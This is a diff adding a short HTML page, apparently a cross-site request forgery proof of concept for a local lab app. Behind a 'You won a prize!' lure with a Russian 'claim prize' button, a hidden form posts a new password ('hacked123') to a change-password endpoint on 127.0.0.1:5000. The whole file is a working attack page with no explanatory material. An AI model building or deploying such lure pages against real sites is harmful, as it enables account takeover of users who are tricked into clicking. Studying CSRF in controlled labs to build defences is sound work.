@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head><title>Win a Prize!</title></head>
+<body>
+    <h1>You won a prize! Wait a moment...</h1>
+    
+    <form id="csrf-form" action="http://127.0.0.1:5000/change-password" method="POST" style="display:none;">
+        <input type="hidden" name="new_password" value="hacked123">
+    </form>
+    
+    <button onclick="document.getElementById('csrf-form').submit();" style="padding: 10px 20px; font-size: 16px;">
+        Получить приз
+    </button>
+</body>
+</html>
